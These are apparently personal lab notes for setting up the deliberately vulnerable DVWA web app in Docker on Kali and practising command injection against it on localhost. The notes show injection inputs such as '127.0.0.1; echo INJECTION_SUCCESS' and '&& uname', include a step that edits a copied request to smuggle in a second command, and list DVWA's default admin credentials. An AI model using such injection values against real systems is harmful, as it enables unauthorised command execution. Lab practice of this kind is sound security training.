
1.open kali terminal
2.sudo apt update
3. sudo apt install -y docker.io
4. sudo systemctl enable --now docker
5.sudo docker run --rm -d --name dvwa -p 8080:80 vulnerables/web-dvwa
6.sudo docker ps
7.Open DVWA in the browser
8.http://127.0.0.1:8080/
Click on Create/Reset DB
• Username: admin
• Password: password
9.DVWA Security → set to LOW
10.command injection(left side)
11.   127.0.0.1
      127.0.0.1; echo INJECTION_SUCCESS
      127.0.0.1 && uname –a
      127.0.0.1; ping -c 2 127.0.0.1
12. open cli dev tools--ctrl+shift+i ->dev tools->network->post->right click->copy value->copy as url
13. paste on terminal
14. change --data-raw 'ip=127.0.0.1&Submit=Submit' -> --data-raw 'ip=127.0.0.1; echo INJECTION_SUCCESS&Submit=Submit'
15.sudo docker exec -it dvwa bash -lc 'tail -n 120 /var/log/apache2/access.log'
